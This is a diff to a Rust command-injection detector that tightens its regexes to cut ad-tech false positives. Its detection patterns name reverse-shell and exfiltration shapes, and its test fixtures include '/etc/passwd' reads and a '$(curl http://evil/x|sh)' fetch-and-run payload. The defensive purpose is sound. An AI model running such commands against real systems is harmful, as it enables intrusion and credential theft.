@@ -69,58 +69,56 @@ static LOG4SHELL_PATTERNS: LazyLock<Vec<Regex>> = LazyLock::new(|| {
 });
 
 static CMDI_PATTERNS: LazyLock<Vec<Regex>> = LazyLock::new(|| {
-    [
-        // Command-substitution forms: $(cmd), `cmd`.
-        // Conservative — require non-empty content to skip lone
-        // `$()` strings that occasionally appear in templates.
-        // 2026-05-22 (legit-dataset FP fix) — the bare `${VAR}` pattern
-        // was REMOVED: `${...}` is shell VARIABLE EXPANSION, not command
-        // execution, and collided with ubiquitous ad-tech / template
-        // macros (`${UUID}`, `${AUCTION_PRICE}`, `${user.name}`) — the
-        // single biggest cmdi false positive on real traffic. Log4Shell
-        // `${jndi:…}` is matched separately in LOG4SHELL_PATTERNS;
-        // SSTI `${…}` shapes belong to the template_injection detector.
-        r"(?i)\$\([^)]+\)",
-        r"(?i)`[^`]+`",
-        // Pipe-to-shell-cmd: `| whoami`, `| nc -e ...`. The
-        // shell-builtin list catches the OWASP cmdi sample set
-        // and stays narrow enough to skip bare pipes in regex /
-        // base64 / OR-style filter expressions. `sleep` and
-        // `timeout` added 2026-05-09 (Run-6 GAP-013) for blind-RCE
-        // detection — `;sleep+5;` is the canonical primitive when
-        // the attacker has no output channel.
-        // 2026-05-22 (legit-dataset FP fix) — the trailing boundary was
-        // `\b`, which let `;cat=…`, `;id=…`, `;ls=…` match (the shell
-        // command name collides with a query param name, e.g.
-        // DoubleClick floodlight `/activity;…;cat=…`). The boundary now
-        // requires a real shell-arg context — whitespace, `/`, `$` (IFS
-        // evasion), end, or another shell separator — and explicitly NOT
-        // `=` (param) or a word char (`category`).
-        r"(?i)\|\s*(?:whoami|id|uname|cat|ls|nc\b|ncat|netcat|curl|wget|sh\b|bash|zsh|ksh|dash|cmd\.exe|powershell|python|perl|ruby|php|nslookup|ping|rm\b|mv\b|chmod|chown|nc\.exe|sleep\b|timeout\b)(?:[\s/;|&$]|$)",
-        // Semicolon-shell-cmd: `; whoami`, `; rm -rf /tmp`,
-        // `; sleep 5` (blind-RCE primitive — GAP-013).
-        r"(?i);\s*(?:whoami|id|uname|cat|ls|nc\b|ncat|netcat|curl|wget|sh\b|bash|zsh|ksh|dash|cmd\.exe|powershell|python|perl|ruby|php|nslookup|ping|rm\b|mv\b|chmod|chown|nc\.exe|sleep\b|timeout\b)(?:[\s/;|&$]|$)",
-        // Logical-AND / logical-OR command chaining.
-        r"(?i)(?:&&|\|\|)\s*(?:whoami|id|uname|cat|ls|nc\b|ncat|netcat|curl|wget|sh\b|bash|zsh|ksh|dash|cmd\.exe|powershell|python|perl|ruby|php|nslookup|ping|rm\b|mv\b|chmod|chown|sleep\b|timeout\b)(?:[\s/;|&$]|$)",
+    // Shell-command alternation, reused by the substitution +
+    // separator patterns. Short ambiguous names carry an inline `\b`.
+    const CMD: &str = r"whoami|id|uname|cat|ls|nc\b|ncat|netcat|curl|wget|sh\b|bash|zsh|ksh|dash|cmd\.exe|powershell|python|perl|ruby|php|nslookup|ping|rm\b|mv\b|chmod|chown|nc\.exe|sleep\b|timeout\b";
+    // Shell-arg context the command must be followed by (whitespace,
+    // path `/`, `$` IFS-evasion, end, or another separator) — NOT `=`
+    // (`;cat=…`) or a word char (`category`).
+    const ARG: &str = r"(?:[\s/;|&$]|$)";
+
+    // Command-substitution + separator forms — ALL require a real shell
+    // command inside/after the metacharacter.
+    //
+    // 2026-05-22 (legit-dataset FP fix):
+    //   - `$(…)` / `` `…` `` previously matched ANY paired delimiters
+    //     (`\$\([^)]+\)`, `` `[^`]+` ``), so high-entropy ad-tech
+    //     telemetry blobs full of random `()`/backticks false-positived.
+    //     Now the content must contain a shell command.
+    //   - the `;`/`|`/`&&` boundary was `\b`, letting `;cat=…`, `;id=…`
+    //     collide with query/matrix params (DoubleClick floodlight
+    //     `/activity;…;cat=…`). Now bounded by ARG (not `=`).
+    //   - the bare `${VAR}` pattern was REMOVED entirely: `${…}` is
+    //     shell VARIABLE EXPANSION, not execution, and collided with
+    //     ad-tech macros (`${UUID}`, `${AUCTION_PRICE}`). Log4Shell
+    //     `${jndi:…}` stays in LOG4SHELL_PATTERNS; SSTI `${…}` is the
+    //     template_injection detector's job.
+    let mut pats: Vec<String> = vec![
+        format!(r"(?i)\$\([^)]*(?:{CMD})(?:[\s/;|&$][^)]*)?\)"),
+        format!(r"(?i)`[^`]*(?:{CMD})(?:[\s/;|&$][^`]*)?`"),
+        format!(r"(?i)\|\s*(?:{CMD}){ARG}"),
+        format!(r"(?i);\s*(?:{CMD}){ARG}"),
+        format!(r"(?i)(?:&&|\|\|)\s*(?:{CMD}){ARG}"),
+    ];
+    // Literal patterns (no command-alternation reuse).
+    for p in [
         // /bin/{sh,bash,zsh,ksh,dash} direct invocation.
         r"(?i)/bin/(?:sh|bash|zsh|ksh|dash)\b",
-        // Classic exfil shape — `cat /etc/passwd`. (Distinct
-        // from path_traversal's `/etc/passwd` URL-path match —
-        // this catches the cmdi shape `;cat /etc/passwd`.)
+        // Classic exfil shape — `cat /etc/passwd`.
         r"(?i)cat\s+/etc/passwd",
         // Reverse-shell shapes.
         r"(?i)bash\s+-i\b",
         r"(?i)nc\s+-e\b",
         r"(?i)mkfifo\s+",
-        // Wget / curl exfil to attacker hosts when paired with
-        // shell-injection context (semicolon, pipe, backtick
-        // before the cmd). Overlaps with SSRF on URL surface;
-        // this catches the cmdi shape specifically.
+        // Wget / curl exfil to attacker hosts when paired with a
+        // shell-injection context (semicolon, pipe, backtick, $().
         r"(?i)(?:^|;|\|\|?|&&|`|\$\()\s*(?:wget|curl)\s+[a-z]+://",
-    ]
-    .iter()
-    .map(|p| Regex::new(p).expect("cmdi regex compiles"))
-    .collect()
+    ] {
+        pats.push(p.to_string());
+    }
+    pats.iter()
+        .map(|p| Regex::new(p).expect("cmdi regex compiles"))
+        .collect()
 });
 
 impl Detector for CommandInjectionDetector {
@@ -359,6 +357,19 @@ mod tests {
     negative!(cmdi_category_word,        "/shop;category=shoes");
     // ...but a real `;cat /etc/passwd` (space-arg) still fires.
     positive!(cmdi_semicolon_cat_arg,    "/run?cmd=x;cat%20/etc/passwd");
+
+    // 2026-05-22 (legit-dataset FP fix) — high-entropy ad-tech telemetry
+    // blobs (Moat/Celtra `/pixel.gif`) contain random paired backticks /
+    // `$(`…`)` with NO shell command inside. They must NOT flag — the
+    // substitution patterns now require a real command between the
+    // delimiters.
+    negative!(cmdi_adtech_backtick_blob,
+        "/pixel.gif?qn=%604%7BZEYwoqI%24%5BK%2BdLLU%2CMm~tR%2390vv9L%24%2FoDb%60RP%3C");
+    negative!(cmdi_adtech_subshell_blob,
+        "/pixel.gif?ql=%5B6C(TgPB*e%5D1(rI%24(rj2Iy)pw%40aOS");
+    // ...real command substitution still fires.
+    positive!(cmdi_backtick_cat,         "/x?q=%60cat%20/etc/passwd%60");
+    positive!(cmdi_subshell_curl_pipe,   "/x?q=%24(curl%20http://evil/x%7Csh)");
 
     // ============================================================
     // GAP-008 (2026-05-08) — Log4Shell coverage
